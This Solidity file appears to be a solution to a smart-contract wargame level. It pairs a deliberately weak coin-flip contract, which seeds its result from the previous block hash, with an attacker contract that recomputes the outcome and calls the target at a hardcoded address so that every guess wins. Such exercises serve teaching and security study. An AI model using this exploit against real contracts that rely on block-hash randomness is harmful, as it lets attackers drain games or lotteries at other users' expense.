// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract hackCoinFlip {
    struct Coinflip {
        address originalContract;
    }

    CoinFlip public originalContract =
        CoinFlip(0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // use this function if you want to manually enter the value true or false
    // function hackFlip(bool _guess) public {

    //     // pre-deteremine the flip outcome
    //     uint256 blockValue = uint256(blockhash(block.number - 1));
    //     uint256 coinFlip = blockValue / FACTOR;
    //     bool side = coinFlip == 1 ? true : false;

    //     // If I guessed correctly, submit my guess
    //     if (side == _guess) {
    //         originalContract.flip(_guess);
    //     } else {
    //         // If I guess incorrectly, submit the opposite
    //         originalContract.flip(!_guess);
    //     }
    // }

    //else use this function to automaticaly pass what getBool is finding
    function hackFlip() public {
        originalContract.flip(getBool());
    }

    function getBool() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}